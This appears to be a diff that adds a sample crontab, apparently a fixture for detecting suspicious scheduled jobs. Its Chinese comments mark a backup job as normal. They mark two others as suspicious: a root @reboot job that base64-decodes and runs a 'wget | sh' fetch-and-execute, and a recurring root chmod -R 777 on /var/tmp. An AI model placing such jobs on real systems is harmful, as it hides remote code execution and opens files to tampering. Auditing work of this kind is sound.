@@ -1,0 +1,14 @@
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+HOME=/
+
+# 正常任务
+30 4 * * * root /usr/local/bin/backup.sh
+
+# 可疑任务:base64 解码执行 + 777 权限下放
+@reboot root echo "d2dldCB8IHNo" | base64 -d | bash
+*/13 * * * * root chmod -R 777 /var/tmp/
+
+# 环境变量行
+RANDOM_DELAY=10
